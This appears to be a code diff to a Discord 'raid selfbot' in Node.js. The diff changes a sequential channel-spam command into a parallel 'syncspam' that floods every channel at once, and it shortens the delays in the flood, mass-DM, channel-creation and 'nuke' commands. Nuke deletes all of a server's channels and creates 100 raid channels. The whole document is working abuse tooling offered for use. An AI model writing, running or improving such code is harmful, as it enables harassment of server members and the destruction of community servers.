@@ -20,6 +20,7 @@ app.listen(PORT, () => {
 client.on('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     console.log(`VAMO RAID SELFBOT READY`);
+    console.log(`!syncspam - All channels get message #1 together, then #2 together, etc.`);
 });
 
 // Your exact raid message
@@ -39,8 +40,8 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== SPAM ALL CHANNELS (100 MESSAGES EACH WITH 1-2s DELAYS) =====
-    if (command === 'spamall') {
+    // ===== SYNC SPAM - ALL CHANNELS TOGETHER =====
+    if (command === 'syncspam') {
         const guild = message.guild;
         if (!guild) return;
 
@@ -53,53 +54,51 @@ client.on('messageCreate', async (message) => {
             c.permissionsFor(guild.members.me).has('SendMessages')
         );
 
-        console.log(`🔥 SPAMALL: Spamming ${channels.size} channels with 100 messages each (1-2s delays)...`);
+        const channelList = [...channels.values()];
+        const channelCount = channelList.length;
+        
+        console.log(`🔥 SYNC SPAM: ${channelCount} channels will get messages #1-100 TOGETHER`);
 
         let totalSent = 0;
-        let totalFailed = 0;
+        let failedMessages = 0;
 
-        // Loop through each channel
-        for (const [channelId, channel] of channels) {
-            console.log(`\n📢 Spamming #${channel.name}...`);
+        // For each message number (1 to 100)
+        for (let messageNum = 1; messageNum <= 100; messageNum++) {
+            console.log(`\n📢 Sending message #${messageNum} to ALL ${channelCount} channels simultaneously...`);
             
-            // Send 100 messages to this channel
-            for (let i = 1; i <= 100; i++) {
+            // Create an array of promises - one for each channel
+            const sendPromises = channelList.map(async (channel) => {
                 try {
                     await channel.send(raidMessage);
-                    totalSent++;
-                    
-                    // Log progress every 10 messages
-                    if (i % 10 === 0) {
-                        console.log(`   ✅ ${i}/100 messages sent in #${channel.name}`);
-                    }
-                    
-                    // Random delay between 1-2 seconds (1000-2000ms)
-                    const waitTime = Math.floor(Math.random() * 1000) + 1000;
-                    await delay(waitTime);
-                    
+                    return { success: true, channel: channel.name };
                 } catch (error) {
-                    totalFailed++;
-                    console.log(`   ❌ Failed message ${i} in #${channel.name}: ${error.message}`);
-                    
-                    // If rate limited, wait 5 seconds
-                    if (error.message.includes('rate')) {
-                        console.log('   ⏳ Rate limited, waiting 5 seconds...');
-                        await delay(5000);
-                    } else {
-                        // If permission error, move to next channel
-                        break;
-                    }
+                    console.log(`   ❌ Failed in #${channel.name} for message #${messageNum}: ${error.message}`);
+                    failedMessages++;
+                    return { success: false, channel: channel.name };
                 }
-            }
+            });
+
+            // Wait for ALL channels to receive THIS message number
+            const results = await Promise.allSettled(sendPromises);
             
-            // 2 second delay between channels
-            console.log(`   ✅ Completed #${channel.name}`);
-            await delay(2000);
+            const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
+            totalSent += successful;
+            
+            console.log(`   ✅ Message #${messageNum} sent to ${successful}/${channelCount} channels`);
+            
+            // Delay between message rounds (all channels rest together)
+            const waitTime = 1500; // 1.5 seconds between rounds
+            console.log(`   ⏱️  Waiting ${waitTime/1000}s before next round...`);
+            await delay(waitTime);
         }
 
-        console.log('\n' + '='.repeat(50));
-        console.log(`✅ SPAMALL COMPLETE: Sent ${totalSent} messages, Failed: ${totalFailed}`);
-        console.log('='.repeat(50));
+        console.log('\n' + '='.repeat(60));
+        console.log(`✅ SYNC SPAM COMPLETE!`);
+        console.log(`📊 Total messages sent: ${totalSent}`);
+        console.log(`📊 Failed messages: ${failedMessages}`);
+        console.log(`📊 Channels used: ${channelCount}`);
+        console.log(`📊 Messages per channel: 100`);
+        console.log('='.repeat(60));
     }
 
     // ===== FLOOD CURRENT CHANNEL =====
@@ -109,25 +108,19 @@ client.on('messageCreate', async (message) => {
         const count = parseInt(args[0]) || 100;
         const channel = message.channel;
 
-        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name} with 1-2s delays...`);
-
-        let sent = 0;
-        let failed = 0;
+        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name}...`);
 
         for (let i = 1; i <= count; i++) {
             try {
                 await channel.send(raidMessage);
-                sent++;
                 
                 if (i % 10 === 0) {
                     console.log(`   ✅ ${i}/${count} messages sent`);
                 }
                 
-                // Random delay between 1-2 seconds
-                await delay(Math.floor(Math.random() * 1000) + 1000);
+                await delay(1000); // 1 second delay
                 
             } catch (error) {
-                failed++;
                 console.log(`   ❌ Failed message ${i}: ${error.message}`);
                 
                 if (error.message.includes('rate')) {
@@ -137,7 +130,7 @@ client.on('messageCreate', async (message) => {
             }
         }
 
-        console.log(`✅ FLOOD COMPLETE: Sent ${sent} messages, Failed: ${failed}`);
+        console.log(`✅ FLOOD COMPLETE`);
     }
 
     // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
@@ -152,10 +145,7 @@ client.on('messageCreate', async (message) => {
 
         const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
         
-        console.log(`🔥 Creating ${channelCount} channels with 1-2s delays...`);
-
-        let created = 0;
-        let failed = 0;
+        console.log(`🔥 Creating ${channelCount} channels...`);
 
         for (let i = 1; i <= channelCount; i++) {
             try {
@@ -163,19 +153,12 @@ client.on('messageCreate', async (message) => {
                     type: 'text'
                 });
                 await newChannel.send(raidMessage);
-                created++;
                 console.log(`✅ Created channel ${i}/${channelCount}`);
-                
-                // 1-2 second delay between channel creation
-                await delay(Math.floor(Math.random() * 1000) + 1000);
-                
+                await delay(1000);
             } catch (error) {
-                failed++;
                 console.log(`❌ Failed: ${error.message}`);
             }
         }
-
-        console.log(`✅ Created ${created} channels, Failed: ${failed}`);
     }
 
     // ===== MASS DM COMMAND =====
@@ -183,10 +166,9 @@ client.on('messageCreate', async (message) => {
         const guild = message.guild;
         await message.channel.send('✅ VAMO ACTIVATED');
 
-        console.log(`🔥 Mass DM to ${guild.memberCount} members with 1-2s delays...`);
+        console.log(`🔥 Mass DM to members...`);
 
         let sent = 0;
-        let failed = 0;
 
         for (const member of guild.members.cache.values()) {
             if (member.user.bot || member.id === client.user.id) continue;
@@ -199,15 +181,14 @@ client.on('messageCreate', async (message) => {
                     console.log(`✅ DMs sent: ${sent}`);
                 }
                 
-                // 1-2 second delay between DMs
-                await delay(Math.floor(Math.random() * 1000) + 1000);
+                await delay(1200);
                 
             } catch (e) {
-                failed++;
+                // Ignore failed DMs
             }
         }
 
-        console.log(`✅ MassDM complete: Sent to ${sent} members, Failed: ${failed}`);
+        console.log(`✅ MassDM complete: Sent to ${sent} members`);
     }
 
     // ===== NUKE COMMAND =====
@@ -218,25 +199,20 @@ client.on('messageCreate', async (message) => {
         await message.channel.send('✅ VAMO ACTIVATED');
 
         // Delete all channels
-        console.log('🔥 Deleting all channels with 1-2s delays...');
-        let deleted = 0;
-        
+        console.log('🔥 Deleting all channels...');
         for (const channel of guild.channels.cache.values()) {
             try {
                 await channel.delete();
-                deleted++;
                 console.log(`✅ Deleted ${channel.name}`);
-                await delay(Math.floor(Math.random() * 1000) + 1000);
+                await delay(800);
             } catch (error) {
                 console.log(`❌ Failed to delete: ${error.message}`);
             }
         }
-        console.log(`✅ Deleted ${deleted} channels`);
 
         // Create 100 channels
-        console.log('🔥 Creating 100 channels with 1-2s delays...');
+        console.log('🔥 Creating 100 channels...');
         const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
-        let created = 0;
 
         for (let i = 1; i <= 100; i++) {
             try {
@@ -244,28 +220,25 @@ client.on('messageCreate', async (message) => {
                     type: 'text'
                 });
                 await newChannel.send(raidMessage);
-                created++;
                 console.log(`✅ Created channel ${i}/100`);
-                await delay(Math.floor(Math.random() * 1000) + 1000);
+                await delay(1000);
             } catch (error) {
                 console.log(`❌ Failed: ${error.message}`);
             }
         }
 
         console.log('✅ NUKE COMPLETE');
-        console.log(`✅ Deleted: ${deleted} channels`);
-        console.log(`✅ Created: ${created} channels`);
     }
 
     // ===== HELP COMMAND =====
     if (command === 'help') {
         await message.channel.send(`**🔥 VAMO RAID SELFBOT**
 
-!spamall - 100 messages to EVERY channel (1-2s delays)
-!flood [count] - Flood current channel (1-2s delays)
-!spamchannels [num] - Create raid channels (1-2s delays)
-!massdm - DM all members (1-2s delays)
-!nuke - Delete all + create 100 channels (1-2s delays)
+!syncspam - ALL channels get message #1 together, #2 together (100 each)
+!flood [count] - Flood current channel
+!spamchannels [num] - Create raid channels
+!massdm - DM all members
+!nuke - Delete all + create 100 channels
 !help - Show this menu
 
 ✅ VAMO ACTIVATED`);
